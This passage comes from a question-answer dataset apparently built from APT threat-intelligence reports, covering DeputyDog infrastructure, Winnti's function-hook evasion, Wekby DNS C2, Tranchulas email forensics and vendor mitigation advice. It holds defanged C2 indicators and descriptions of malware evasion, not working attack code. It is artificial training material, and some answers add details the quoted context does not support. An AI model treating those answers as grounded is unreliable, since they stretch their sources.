addresses:\n58.64.200.178\n58.64.200.179\n103.20.192.4\nWe previously observed Gh0stRat samples with the custom packet flag \"HTTPS\" calling back to book[.]flnet[.]org and icybin[.]flnet[.]org. The threat actor responsible for (<http://www.fireeye.com/blog/technical/cyber-exploits/2013/09/operation-deputydog-zero-day-cve-2013-3893-attack-against-japanese-targets.html>)Operation DeputyDog also used the \"HTTPS\" version of the (<http://www.emc.com/collateral/hardware/solution-overview/h11146-the-voho-campaign-so.pdf>)Gh0st. We also observed another \"HTTPS\" Gh0st variant connecting to a related command and control server at me[.]scieron[.]com.\nThe me[.]scieron[.]com domain previously resolved to 58.64.199.22. The book[.]flnet[.]org domain also resolved to another IP in the same subnet 58.64.199.0/24. Specifically, book[.]flnet[.]org previously resolved to 58.64.199.27.\nOthers domain seen resolving to this same /24 subnet were dll[.]freshdns[.]org, ali[.]blankchair[.]com, and cht[.]blankchair[.]com. The domain dll[.]freshdns[.]org resolved to 58.64.199.25. Both ali[.]blankchair[.]com and cht[.]blankchair[.]com resolved to 58.64.199.22.\nA number of other related domains resolve to these IPs and other IPs also in this /24 subnet. For the purposes of this blog, we've chosen to focus on those domains and IP that relate to the previously discussed DeputyDog and Ephemeral Hydra campaigns.\nYou may recall that dll[.]freshdns[.]org, ali[.]blankchair[.]com and cht[.]blankchair[.]com were all linked to both (<http://www.fireeye.com/blog/technical/cyber-exploits/2013/09/operation-deputydog-zero-day-cve-2013-3893-attack-against-japanese-targets.html>)Operation DeputyDog and (<http://www.fireeye.com/blog/technical/cyber-exploits/2013/11/operation-ephemeral-hydra-ie-zero-day-linked-to-deputydog-uses-diskless-method.html>)Operation Ephemeral Hydra. Figure 1 illustrates the infrastructure overlaps and connections we observed between the strategic Web compromise campaign leveraging the VFW's website, the DeputyDog, and the Ephemeral Hydra operations.\nBig Headline: Links to DeputyDog and Ephemeral Hydra\nOther tradecraft similarities between the actor(s) responsible for this campaign and the actor(s) responsible for the DeputyDog/Ephemeral Hydra campaigns include:\nThe use of zero-day exploits to deliver a remote access Trojan (RAT)\nThe use of strategic web compromise as a vector to distribute remote access Trojans\nThe use of a simple single-byte XOR encoded (0\u00d795) payload obfuscated with a .jpg extension\nThe use of Gh0stRat with the \"HTTPS\" packet flag\nThe use of related command-and-control (CnC) infrastructure during the similar time frames\nThey build ROP chains and shellcode the same way, both choose to corrupt a Flash Vector object, have some identical functions with common typos, and even share the same name.\nBig Headline: Conclusion\nThese actors have previously targeted a number of different industries, including:\nU.S. government entities\nJapanese firms\nDefense industrial base (DIB) companies\nLaw firms\nInformation technology (IT) companies\nMining companies\nNon-governmental organizations (NGOs)\nThe proven ability to successfully deploy a number of different private and public RATs using zero-day exploits against high-profile targets likely indicates that this actor(s) will continue to operate in the mid to long-term.\nThis entry was posted in (<http://www.fireeye.com/blog/category/technical/malware-research>)Advanced Malware, (<http://www.fireeye.com/blog/category/technical/cyber-exploits>)Exploits, (<http://www.fireeye.com/blog/category/technical/targeted-attack>)Targeted Attack, (<http://www.fireeye.com/blog/category/technical>)Threat Research, (<http://www.fireeye.com/blog/category/technical/vulnerabilities>)Vulnerabilities and tagged (<http://www.fireeye.com/blog/tag/0day>)0day, (<http://www.fireeye.com/blog/tag/zero-day>)zero-day by (<http://www.fireeye.com/blog/author/darien-kindlund>)Darien Kindlund, (<http://www.fireeye.com/blog/author/dan-caselden>)Dan Caselden, (<http://www.fireeye.com/blog/author/xiaobo-chen>)Xiaobo Chen, (<http://www.fireeye.com/blog/author/ned-moran>)Ned Moran and (<http://www.fireeye.com/blog/author/mscott>)Mike Scott. Bookmark the (<http://www.fireeye.com/blog/technical/cyber-exploits/2014/02/operation-snowman-deputydog-actor-compromises-us-veterans-of-foreign-wars-website.html>)permalink.\n\nQ: How does the infrastructure analysis in the Operation SnowMan attack reveal links to previous campaigns like DeputyDog and Ephemeral Hydra, and what are the key indicators of these connections?",
    "output": "A: The infrastructure analysis in the Operation SnowMan attack reveals links to previous campaigns through overlapping domains and IP addresses. For instance, the domain info[.]flnet[.]org overlaps with icybin[.]flnet[.]org and book[.]flnet[.]org via previous resolutions to specific IP addresses. These domains were also associated with Gh0stRat samples using the 'HTTPS' packet flag, which was a characteristic of the DeputyDog campaign. Additionally, the domain me[.]scieron[.]com resolved to an IP in the same subnet as book[.]flnet[.]org, further linking it to DeputyDog and Ephemeral Hydra. Other domains like dll[.]freshdns[.]org, ali[.]blankchair[.]com, and cht[.]blankchair[.]com also resolved to IPs in this subnet, indicating a broader network of related infrastructure. These connections suggest that the actors behind Operation SnowMan are likely the same or affiliated with those responsible for DeputyDog and Ephemeral Hydra.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: APPENDIX C: VPSNOC Email Header Analysis\nThe Kansas-City-based hosting provider sent an introductory email message on July 24th, 2013 at 1500 CDT and would be received by TCIRT at 1400 EDT and VPSNOC on Thursday July 25th, 2013 at 1200 PKT. 49\nAnalysis of the VPSNOC email50 header indicated that the message was sent on Thursday 25 July at 02:28:41 +0500 GMT, which is consistent with Pakistan's time zone. Of note, the email message was sent with an X-Originating IP Address of 184.75.214.10 corresponding to a Private Internet Access51 Canadian proxy52. VPSNOC's use of this commercial proxy service likely demonstrates the intent to mask the apparent origin of the sender.\nThese two examples highlight that VPSNOC's inbound and outbound email communications consistently utilized a +0500 Pakistani timezone.\n49  Digital Appendix 1: Raw Email Communications; Email#1 Subject- Re- Contact Info (Date- Wed, 24 Jul 2013 14-00-29 -0500).eml\n50  Digital Appendix 2: Raw Email Communications; Email#2 Subject- Re- Contact Info (Date- Thu, 25 Jul 2013 02-28-41 +0500).eml\n51  https://www.privateinternetaccess.com\n52  http://pastebin.com/F261NfYa\nMedium Headline: Inconsistency #1: Day & Date Misalignment within image1.png Screenshot\nOur review of the \"Response_ThreatConnect.docx\"53 focused in on the email screenshot (Figure 3) image1.png54 that Khan provided revealing that the date probably had been modified to appear as though they were the first to notify VPSNOC. Within the official response, Zubair Khan indicated that Tranchulas was \"already aware of this incident...and contacted hosting company.\" The official response included a screenshot depicting an email sent to VPSNOC from an unidentified (redacted) tranchulas.com email address that was sent on \"Tue, Jul 21, 2013 at 11:36 PM\" with no evidence of the date in which it was received by or responded to by VPSNOC. This message contained a notable misalignment between the date and day of the week.\nJuly 21, 2013 was a Sunday, not a Tuesday. \"Tuesday\" would have pre-dated our official notification that occurred on Wednesday July 24, 2013, and could indicate that Tranchulas may have obtained insight into the original TCIRT notification through Pakistan-based contacts within VPSNOC. The TCIRT subsequently responded to Mr. Khan's official explanation with a follow-up inquiry, offering Khan an opportunity to explain the date inconsistency within the email screenshot. Mr. Khan deferred our request to Mr. Hamza Qamar55, a Penetration Testing Team Lead at Tranchulas, who later responded56 with a simple denial that the email message had not been altered apart from blurring the name of the original sender.\nQuestion: What inconsistency was found in the email screenshot provided by Zubair Khan, and how might this discrepancy indicate potential insider knowledge or manipulation?",
    "output": "Answer: The inconsistency found in the email screenshot provided by Zubair Khan was a misalignment between the date and the day of the week. The email was purportedly sent on 'Tue, Jul 21, 2013 at 11:36 PM,' but July 21, 2013, was actually a Sunday. This discrepancy suggests that the email may have been altered to create the impression that Tranchulas was aware of the incident before TCIRT's official notification on Wednesday, July 24, 2013. This could indicate that Tranchulas obtained prior knowledge of the notification through Pakistan-based contacts within VPSNOC, implying potential insider information sharing or manipulation of the timeline to cover up their activities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Conclusion\nCTU analysis suggests this activity is related to Iranian threat actors closely aligned with or acting on behalf of the COBALT GYPSY threat group (formerly labeled (<https://www.secureworks.com/research/suspected-iran-based-hacker-group-creates-network-of-fake-linkedin-profiles>)Threat Group-2889). CTU researchers assess with high (<>)confidence that COBALT GYPSY is associated with Iranian government-directed cyber operations, and it has used tactics similar to this campaign:\ntargeting Saudi (<http://researchcenter.paloaltonetworks.com/2016/05/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/>)financial, oil, and (<http://www.clearskysec.com/oilrig/>)technology organizations\nusing (<https://www.cylance.com/operation-cleaver-cylance>)job-themed lures to infect systems\nregistering spoofed domains\nspearphishing new victims using legitimate email addresses\nThis campaign highlights the need for organizations to educate users about the risks of spearphishing and shortened links. CTU researchers recommend that organizations (<https://support.office.com/en-us/article/Enable-or-disable-macros-in-Office-documents-7B4FDD2E-174F-47E2-9611-9EFE4F860B12>)disable macros in Microsoft Office products to prevent attacks that leverage this functionality. Organizations should also incorporate (<https://www.secureworks.com/capabilities/managed-security/network-security/advanced-malware-protection>)advanced malware prevention technology and (<https://www.secureworks.com/capabilities/managed-security/endpoint-security/endpoint-threat-detection>)endpoint threat detection tools as part of their mitigation strategies.\nBig Headline: Gauging confidence level\nCTU researchers have adopted the grading system (<http://www.dni.gov/files/documents/Newsroom/Press Releases/2007 Press Releases/20071203_release.pdf>)published by the U.S. Office of the Director of National Intelligence to indicate confidence in their assessments:\nHigh confidence generally indicates that judgments are based on high-quality information, and/or that the nature of the issue makes it possible to render a solid judgment. A \"high confidence\" judgment is not a fact or a certainty, however, and such judgments still carry a risk of being wrong.\nModerate confidence generally means that the information is credibly sourced and plausible but not of sufficient quality or corroborated sufficiently to warrant a higher level of confidence.\nLow confidence generally means that the information's credibility and/or plausibility is questionable, or that the information is too fragmented or poorly corroborated to make solid analytic inferences, or that [there are] significant concerns or problems with the sources.\n\nWhy did CTU researchers assess with high confidence that the COBALT GYPSY threat group is associated with Iranian government-directed cyber operations, and what specific tactics did this campaign employ?",
    "output": "CTU researchers assessed with high confidence that the COBALT GYPSY threat group is associated with Iranian government-directed cyber operations because the campaign employed tactics similar to those previously attributed to COBALT GYPSY. These tactics included targeting Saudi financial, oil, and technology organizations; using job-themed lures to infect systems; registering spoofed domains; and spearphishing new victims using legitimate email addresses. The high confidence assessment indicates that the judgments are based on high-quality information and that the nature of the issue allows for a solid judgment, although it is not a certainty and still carries a risk of being wrong.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Launching the main function\nAs mentioned above, the PlusDLL library is a control module. Let's look at how the cybercriminals implemented the transition to perform the malicious DLL's main tasks. They could have simply called an appropriate function directly or created a separate thread in which to execute it, but for some reason they resorted to a trick: the code of the SetWindowStationUser function in the user32.dll library was modified. After modification, the function's first command became jmp <addr>, where <addr> is the address of the function in the PlusDLL library which implements the malicious library's main features.\nHook on SetWindowStationUser\nImmediately after this modification, a thread is created (CreateThread) executing code starting from the SetWindowStationUser function address. As a result, when control is eventually passed to this function, the inserted command jmp <addr> returns control back to the PlusDLL code.\nThe same method is used to execute two more functions in the PlusDLL library. One of them is used to initialize network routines; the other executes procedures terminating the malicious program at the very end. The only difference is that instead of SetWindowStationUser, the code of two other functions from user32.dll is modified \u2013 EndTask and WinHelpW, respectively.\nIt is likely that this was done in order to hide the real addresses of functions in PlusDLL in case its code was analyzed based on its execution logs using an automatic system (sandbox) that looks at all function calls. If this trick is used, an execution log would only show threads launched from the addresses of the functions SetWindowStationUser, EndTask and WinHelpW, which could potentially confuse researchers.\nAnother possibility is that this is an anti-emulation feature. Perhaps the emulators built into some anti-virus products are unable to cope with these 'leaps' \u2013 in this case, emulation will not result in the execution of malicious functions, which also suits the cybercriminals' purposes.\nSmall Headline: Target Functionality\nSo what does PlusDLL control? It turns out that the target functionality is implemented in different files. Each file provides a specific remote control feature and is downloaded from the attackers' server every time the system starts up. These files are not saved on disk or in the registry but are loaded directly into the memory.\nAt the very start of the operation, after launching the driver, PlusDLL collects information about the infected system. A unique identifier for the infected computer is generated based on information about the hard drive and the network adapter's MAC address, e.g., TKVFP-XZTTL-KXFWH-RBJLF-FXWJR. The attackers are interested primarily in the computer's name, the program which loaded the malicious library, as well as information about\nremote desktop sessions (session name, client name, user name and session time). All of this data is collected in a buffer, which is then compressed and sent to the attackers' control center. The buffer may look like this:\nThe bot sends information about an infected system to the control center\nIn reply to this initial message from the bot, the control center sends the list of available plugins. Plugins are DLL libraries that provide specific remote control functions. Upon receiving the list of plugins, the bot downloads them, allocates them in the memory and passes control to these libraries.\nDifferent C2 servers could push different plugins. In total we have discovered eight functional libraries:\nThese plugins form the core toolkit which is used by the perpetrators during attack.\nSmall Headline: Operation of the malicious platform\nOperation flowchart at the initial stage\nAs you can see, the cybercriminals use an entire inventory of malicious tools to effectively control the remote computer. Moreover, they have taken measures to conceal their activities: the plugins do not explicitly appear anywhere except in the computer's memory; they do not get saved to the hard drive; the driver is deleted immediately after launch; all traces in the registry that could indicate this launch get deleted. Only the initial DLL remains on the disk that kick starts the entire process and contains an encrypted version of PlusDLL which is the control DLL.\nOne of the weak points in this architecture is that the driver does get saved to the hard drive before it launches, so anti-virus products can detect the emergence of this file. The situation is further exacerbated by the fact that the malicious drivers may be signed (although not all drivers in the Winnti samples that we detected were in fact signed). An unsigned driver in itself does not have the means to counter antivirus products and its code can be easily recognized as malicious, whereas signed drivers stand a better chance of remaining undetected by antivirus products: certain anti-virus products consider properly signed programs legitimate by default, so as to minimize the chances of false positive responses.\nKaspersky Lab's products detect the malicious programs described above under the following verdicts:\nThe initial DLLs winmm.dll and apphelp.dll, the PlusDll.dll control DLLs, and functional loadable modules (CmdPlus.dll etc.) are detected as Backdoor.Win32.Winnti or Backdoor.Win64.Winnti.\nThe drivers sp1itter.sys and acplec.sys are detected as Rootkit.Win32.Winnti or Rootkit.Win64.Winnti.\n\nBased on the above text, answer a question. How did the Winnti group implement the transition to perform the main tasks of the malicious DLL, and what potential reasons might there be for using this method?",
    "output": "The Winnti group implemented the transition to perform the main tasks of the malicious DLL by modifying the code of the SetWindowStationUser function in the user32.dll library. They inserted a jump instruction (jmp <addr>) that redirected control to the PlusDLL library's main function. This method was likely used to obfuscate the real addresses of functions in PlusDLL, making it harder for automatic analysis systems (sandboxes) to trace the execution flow accurately. Additionally, it could serve as an anti-emulation feature, potentially confusing emulators built into some antivirus products, which might not handle these 'leaps' correctly.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Related URLs:\nTrend Micro Incorporated, a global leader in security software, strives to make the world safe for exchanging digital information. Our innovative solutions for consumers, businesses and governments provide layered content security to protect information on mobile devices, endpoints, gateways, servers and the cloud. All of our solutions are powered by cloud-based global threat intelligence, the Trend Micro\u2122 Smart Protection Network\u2122, and are supported by over 1,200 threat experts around the globe. For more information, visit www.trendmicro.com.\n\u00a92016 by Trend Micro, Incorporated. All rights reserved. Trend Micro and the Trend Micro t-ball logo are trademarks or registered trademarks of Trend Micro, Incorporated. All other product or company names may be trademarks or registered trademarks of their owners.\n10101 N. De Anza Blvd.\nCupertino, CA 95014\nU.S. toll free: 1 +800.228.5651\nPhone: 1 +408.257.1500\nFax: 1 +408.257.2003\n\nAnswer this question based on the above context: How does Trend Micro leverage cloud-based global threat intelligence to enhance its security solutions? Explain the role of the Trend Micro\u2122 Smart Protection Network\u2122 and the importance of threat experts in this context.",
    "output": "Trend Micro leverages cloud-based global threat intelligence through the Trend Micro\u2122 Smart Protection Network\u2122 to enhance its security solutions. This network provides layered content security to protect information across various platforms, including mobile devices, endpoints, gateways, servers, and the cloud. The Smart Protection Network\u2122 is crucial because it enables real-time threat detection and response by aggregating and analyzing threat data from multiple sources globally. Additionally, Trend Micro supports its solutions with over 1,200 threat experts worldwide who contribute to the continuous improvement and effectiveness of these security measures. These experts play a vital role in identifying new threats, developing countermeasures, and ensuring that the solutions remain up-to-date and robust against evolving cybersecurity challenges.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "New Wekby Attacks Use DNS Requests As Command and Control Mechanism\nposted by: Josh Grunzweig, Mike Scott and Bryan Lee on May 24, 2016 11:30 AM\nfiled in: Malware, Threat Prevention, Unit 42 tagged: command and control, DNS, pisloader, Wekby\nWe have observed an attack led by the APT group Wekby targeting a US-based organization in recent weeks. Wekby is a group that has been active for a number of years, targeting various industries such as healthcare, telecommunications, aerospace, defense, and high tech. The group is known to leverage recently released exploits very shortly after those exploits are available, such as in the case of HackingTeam's Flash zero-day exploit.\nThe malware used by the Wekby group has ties to the HTTPBrowser malware family, and uses DNS requests as a command and control mechanism. Additionally, it uses various obfuscation techniques to thwart researchers during analysis. Based on metadata seen in the discussed samples, Palo Alto Networks has named this malware family 'pisloader'.\n\nBased on the above text, answer a question. How does the Wekby APT group utilize DNS requests as a command and control mechanism in their attacks, and what are the implications of this method for cybersecurity experts?",
    "output": "The Wekby APT group utilizes DNS requests as a command and control mechanism in their attacks by embedding commands within DNS queries sent to their command and control servers. This method allows the malware to communicate with its operators without raising suspicion, as DNS traffic is common and often overlooked by traditional security measures. The malware used by Wekby, named 'pisloader', has ties to the HTTPBrowser malware family and employs various obfuscation techniques to hinder analysis by researchers. The use of DNS requests for command and control presents significant challenges for cybersecurity experts, as it requires advanced detection methods to identify and mitigate such covert communications. Understanding this technique is crucial for improving defenses against sophisticated APT groups like Wekby.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: MITIGATIONS\nNorth Korean state-sponsored cyber actors use a full array of tactics and techniques to exploit computer networks of interest, acquire sensitive cryptocurrency-intellectual property, and gain financial assets. The U.S. government recommends implementing mitigations to protect critical infrastructure organizations as well as financial sector organizations in the blockchain technology and cryptocurrency industry.\n\u25cf Apply defense-in-depth security strategy. Apply security principles\u2014such as least access models and defense-in-depth\u2014to user and application privileges to help prevent exploitation attempts from being successful. Use network segmentation to separate networks into zones based on roles and requirements. Separate network zones can help prevent lateral movement throughout the organization and limit the attack surface. See NSA's Top Ten Cybersecurity Mitigation Strategies for strategies enterprise organizations should use to build a defense-in-depth security posture.\n\u25cf Implement patch management. Initial and follow-on exploitation involves leveraging common vulnerabilities and exposures (CVEs) to gain access to a networked environment. Organizations should have a timely vulnerability and patch management program in place to mitigate exposure to critical CVEs. Prioritize patching of internet-facing devices and monitored accordingly for any malicious logic attacks.\n\u25cf Enforce credential requirements and multifactor authentication. North Korean malicious cyber actors continuously target user credentials, email, social media, and private business accounts. Organizations should ensure users change passwords regularly to reduce the impact of password spraying and other brute force techniques. The U.S. government recommends organizations implement and enforce multifactor authentication (MFA) to reduce the risk of credential theft. Be aware of MFA interception techniques for some MFA implementations and monitor for anomalous logins.\n\u25cf Educate users on social engineering on social media and spearphishing. North Korean actors rely heavily on social engineering, leveraging email and social media platforms to build trust and send malicious documents to unsuspecting users. A cybersecurity aware workforce is one of the best defenses against social engineering techniques like phishing. User training should include how to identify social engineering techniques and awareness to only open links and attachments from trusted senders.\n\u25cf Implement email and domain mitigations. Maintain awareness of themed emails surrounding current events. Malicious cyber actors use current events as lure for potential victims as observed during the COVID-19 pandemic. Organizations should have a robust domain security solution that includes leveraging reputation checks and closely monitoring or blocking newly registered domains (NRDs) in enterprise traffic. NRDs are commonly established by threat actors prior to malicious engagement.\no HTML and email scanning. Organizations should disable HTML from being used in emails and scan email attachments. Embedded scripts may be hard for an antivirus product to detect if they are fragmented. An additional malware scanning interface product can be integrated to combine potentially malicious payloads and send the payload to the primary antivirus product. Hyperlinks in emails should also be scanned\nand opened with precautionary measures to reduce the likelihood of a user clicking on a malicious link.\n\u25cf Endpoint protection. Although network security is critical, devices mobility often means traveling and connecting to multiple different networks that offer varying levels of security. To reduce the risk of introducing exposed hosts to critical networks, organizations should ensure mobile devices have installed security suites to detect and mitigate malware.\n\u25cf Enforce application security. Application allowlisting enables the organization to monitor programs and only allow those on the approved allowlist to execute. Allowlisting helps to stop the initial attack, even if the user clicks a malicious link or opens a malicious attachment. Implement baseline rule sets, such as NSA's Limiting Location Data Exposure guidance, to block execution of unauthorized or malicious programs.\no Disable macros in office products. Macros are a common method for executing code through an attached office document. Some office products allow for the disabling of macros that originate from outside of the organization, providing a hybrid approach when the organization depends on the legitimate use of macros.\n\u25aa Windows specific settings can be configured to block internet-originated macros from running. This can be done in the Group Policy Administrative Templates for each of the associated Office products (specifically Word, Excel and PowerPoint). Other productivity software, such as LibreOffice and OpenOffice, can be configured to set the Macro Security Level.\n\u25cf Be aware of third-party downloads\u2014especially cryptocurrency applications. North Korean actors have been increasingly active with currency generation operations. Users should always verify file downloads and ensure the source is from a reputable or primary (preferred) source and not from a third-party vendor. Malicious cyber actors have continuously demonstrated the ability to trojanize applications and gain a foothold on host devices.\n\u25cf Create an incident response plan to respond to possible cyber intrusions. The plan should include reporting incidents to both the FBI and CISA\u2014quick reporting can reduce the severity of incidents and provide valuable information to investigators. Contact information can be found below.\n\nQ: How does the defense-in-depth security strategy help in protecting organizations from North Korean state-sponsored cyber actors, and what specific measures can be implemented to achieve this?",
    "output": "A: The defense-in-depth security strategy helps protect organizations by applying multiple layers of security controls to prevent exploitation attempts from being successful. Specific measures include applying least access models and defense-in-depth principles to user and application privileges, and using network segmentation to separate networks into zones based on roles and requirements. This separation helps prevent lateral movement throughout the organization and limits the attack surface. Additionally, organizations can refer to NSA's Top Ten Cybersecurity Mitigation Strategies to build a robust defense-in-depth security posture.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: McAfee Early Detection\nCustomers can deploy a number of McAfee products to help protect information systems from the Night Dragon attack:\n\u2022 McAfee Vulnerability Manager: Using agentless discovery and vulnerability checking to assess systems on your network, McAfee Vulnerability Manager is an enterprise-class vulnerability management system that will detect infected Night Dragon systems as well as the security weaknesses in systems that have been compromised. The \"wham-apt-nightdragon-detected-v7.fasl3\" script will detect this threat remotely on systems.\n\u2022 McAfee Policy Auditor: Using agent-based configuration audit checks to determine the most secure configuration of a system, McAfee Policy Auditor software detects the security weaknesses in the systems that have been compromised\n\u2022 McAfee Risk Advisory (MRA): Properly deployed, McAfee Risk Advisor would have allowed administrators to see the misconfigurations and gap in security coverage that facilitated Night Dragon's exploitation\nBig Headline: McAfee Detection\nNight Dragon also displays a pattern of correlated activities with an assortment of other software tools that McAfee can assist companies to identify.\n\u2022 McAfee VirusScan Enterprise: Update your anti-virus .DATs to at least version 6232 and ensure that on-demand scans are working properly and perform a full file system virus scan. Review McAfee ePO software or anti-virus alerts and network logs for \"NightDragon\" signature detections to identify compromised systems. Please submit any related samples to (<mailto:virus_research%40mcafee.com?subject=>)virus_research@mcafee.com or submit on the web at (<https://www.webimmune.net/default.asp>)https://www.webimmune.net/default.asp.\n\u2022 McAfee Network Threat Response: McAfee Network Threat Response technology would have detected the malicious C&C traffic and would have alerted administrators to the attack early, giving them time to react and prevent future damage\nAdministrators can also download the following free tools from McAfee:\n\u2022 McAfee \"(<http://www.mcafee.com/us/downloads/free-tools/index.aspx>)Night Dragon Vulnerability Scanner\" based on (<http://www.mcafee.com/us/products/vulnerability-manager.aspx>)McAfee Vulnerability Manager technology to scan their networks for the presence of malware\n\u2022 McAfee Labs (<http://www.mcafee.com/us/downloads/free-tools/how-to-use-stinger.aspx>)Stinger\nBig Headline: McAfee Prevention\nFor complete prevention of this and most other attacks involving advanced persistent threats (APTs), customers can deploy application whitelisting and change/configuration control software on their critical servers. These technologies completely prevent the unauthorized running of DLLs/EXEs as well as the modification of registry keys, services, and more involved in all of today's APT and zero-day attacks.\n\u2022 McAfee Application Control: McAfee Application Control software stops Night Dragon by not allowing the dropper files from executing (even as administrator on Windows), thereby preventing downloads of additional malware and the setup of C&C channels that allowing RAT control and theft of sensitive files\n\u2022 McAfee Configuration Control: McAfee Configuration Control software allows you to disallow any configuration changes to your systems, protecting them from being modified without explicit permission (even with administrative access)\n\u2022 McAfee Database Activity Monitoring: delivers complete database protection including 0-day attacks and web born attacks such as those seen with SQL injection in Night Dragon.\n\u2022 McAfee Network Security Platform: blocks malicious network activity such as APT command and control traffic.\n\u2022 McAfee Enterprise Firewall: Properly installed and configured at the border and inside your organization, McAfee Firewall would have prevented the Night Dragon operation from penetrating so deeply into the affected organizations and would have blocked C&C communication from the RAT\n\u2022 McAfee Web Gateway: Properly installed and configured, McAfee Web Gateway would have prevented the Night Dragon operation from using their RATs, requiring them to proxy-enable their RATs or use alternative proxy-enabled RATs\n\u2022 McAfee Endpoint Encryption: Properly installed and configured, McAfee Endpoint Encryption software reduces the impact of the Night Dragon attack by restricting access to the core targeted assets\n\u2022 McAfee Data Loss Protection: Properly installed and configured, McAfee Network DLP and/or McAfee Host DLP solutions allow you to prevent and detect the extraction of sensitive information from outside the company\n\u2022 McAfee Host Intrusion Prevention 8.0: McAfee Host Intrusion Prevention 8.0 software has introduced a new \"TrustedSource\" APT detection feature that allows enterprises to correlate endpoint executable activity with the network C&C communication to detect and prevent RAT communications and data exfiltration activity\n\u2022 McAfee VirusScan\u00ae Enterprise: In addition to detecting associated malware and RATs on the endpoint, customers can also leverage access protection features in McAfee VirusScan Enterprise to prevent (and alert on) the creation of Night Dragon-related files and folder structures. Other built-in features such infection tracing and McAfee Global Threat Intelligence\u2122 can assist with the identification and quarantining or removal of new and unknown associated malware and RATs.\nIf you have discovered the presence of Night Dragon in your environment and would like incident-response or forensics assistance to respond and repair, please contact Foundstone Professional Services on (<mailto:incidentresponse%40foundstone.com?subject=>)incidentresponse@foundstone.com or submit any related samples to (<mailto:Virus_Research%40avertlabs.com?subject=>)Virus_Research@avertlabs.com or on the web at (<https://www.webimmune.net/default.asp>)McAfee Labs WebImmune.\nBig Headline: Conclusion\nWell-coordinated, targeted attacks such as Night Dragon, orchestrated by a growing group of malicious attackers committed to their targets, are rapidly on the rise. These targets have now moved beyond the defense industrial base, government, and military computers to include global corporate and commercial targets. While Night Dragon attacks focused specifically on the energy sector, the tools and techniques of this kind can be highly successful when targeting any industry. Our experience has shown that many other industries are currently vulnerable and are under continuous and persistent cyberespionage attacks of this type. More and more, these attacks focus not on using and abusing machines within the organizations being compromised, but rather on the theft of specific data and intellectual property. It is vital that organizations work proactively toward protecting the heart of their value: intellectual property. Enterprises need to take action to discover these assets in their environments, assess their configurations for vulnerabilities, and protect them from misuse and attack.\nFor additional research and information, review Hacking Exposed: Network Secret and Solutions\u20146th Edition (Osborne McGraw-Hill). You can also visit (<http://www.hackingexposed.com>)http://www.hackingexposed.com for information on advanced hacker techniques and to sign up for \"Hacking Exposed\" monthly webinars.\nBig Headline: Credits and Acknowledgements\nThe preceding white paper was a collaborative effort among numerous people and entities including McAfee Foundstone Professional Services consultants, McAfee Labs, McAfee employees, executives, and researchers, HBGary and National Cyber-Forensics & Training Alliance (NCFTA). Significant contributors include Shane Shook, Dmitri Alperovitch, Stuart McClure, Georg Wicherski, Greg Hoglund, Shawn Bracken, Ryan Permeh, Vitaly Zaytsev, Mark Gilbert, Mike Spohn, George Kurtz, and Adam Meyers.\n\nExplain how McAfee Application Control and McAfee Configuration Control can prevent the execution and spread of the Night Dragon attack. What specific actions do these tools take?",
    "output": "McAfee Application Control prevents the Night Dragon attack by stopping the dropper files from executing, even if executed by an administrator on Windows. This prevents the download of additional malware and the setup of Command and Control (C&C) channels, which are essential for Remote Administration Tool (RAT) control and theft of sensitive files. McAfee Configuration Control disallows any configuration changes to systems, protecting them from being modified without explicit permission, even with administrative access. This ensures that the system remains secure and unaltered by the attack.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: Inconsistency #2: Awareness of Withheld Information\nThe email screenshot (image1.png) from within the Tranchulas response demonstrated awareness of information that we initially withheld and later released in our blog post: one malware variant57 that contained a debug string with \"umairaziz27\" the same username as a Tranchulas employee. The Tranchulas message to VPSNOC incorrectly claimed to identify malware on 199.91.173.43 that contained the \"company's name and...employee's name\". While it is possible that Tranchulas' analysts discovered this variant independent of the blog post, it added to the inconsistent elements of the response and further suggested that the blog post may have inspired its communications with VPSNOC. We note that we requested additional information such as the \"detailed analysis report\" within the exchange from Tranchulas but did not receive a response.\nMedium Headline: Inconsistency #3: Tranchulas Direct Notification\nThe Tranchulas response indicates that \"Tranchulas' research team was already aware of this incident before publication of this report. Our team contacted hosting company of server to seek an explanation.\" Considering there are no public references to the identified infrastructure identifying VPSNOC as the \"hosting company\". The only way for Tranchulas to identify VPSNOC as the hosting company was to either have previous insider knowledge of the activity, or to have been privately introduced by the Kansas-City-based service provider to their \"client\" VPSNOC, of which was never mentioned or discussed when we initially exchanged with either the Kansas-City or Pakistan-based hosting providers.\n53 Digital Appendix 1: Research Collateral Response_ThreatConnect.docx (MD5: 6f7010a28f33be02d85deb9ba40ec222)\n54 Digital Appendix 1: Research Collateral image1.png (MD5: d224f39f8e20961b776c238731821d16)\n55 http://pk.linkedin.com/pub/hamza-qamar/22/6b8/109\n56 Digital Appendix 2: Raw Email Communications (Email#4 Subject- Re- Regarding 20130731A- South Asia Cyber Espionage Heats Up - (Date- Thu, 15 Aug 2013 12-52-54 +0500).eml\n57 https://www.virustotal.com/en/file/b9a062e84ab64fc55dedb4ba72f62544eb66d7e1625059d2f149707ecd11f9c0/analysis/\nPublic registration of the 199.91.173.43 reveals the Kansas-City-based hosting provider as the official registrant and owner of the infrastructure. The only way to know that VPSNOC was subleasing the infrastructure was to obtain this information directly from them. There was no public reference which would have revealed VPSNOC as the entity which maintained root access to the 199.91.173.43. Had Tranchulas legitimately conducted an initial victim notification sometime in late July 2013, they would have likely done so through the Kansas-City-based hosting provider and not VPSNOC.\nOn August 15, 2013, Hamza Qamar's response to TCIRT's follow up inquiry to the observed inconsistencies redirected TCIRT personnel to VPSNOC to obtain an explanation versus attempting to explain the observed day date inconsistency and document properties within the Tranchulas email. The TCIRT's suspicion mounted when presenting Tranchulas with the opportunity to set the record straight, that Tranchulas could not substantiate their claims, rather deferring the TCIRT inquiry to a third party (VPSNOC).\nMedium Headline: Inconsistency #4: Tranchulas obtains similar response that TCIRT obtained\nWithin the \"Response_ThreatConnect.docx\" the image 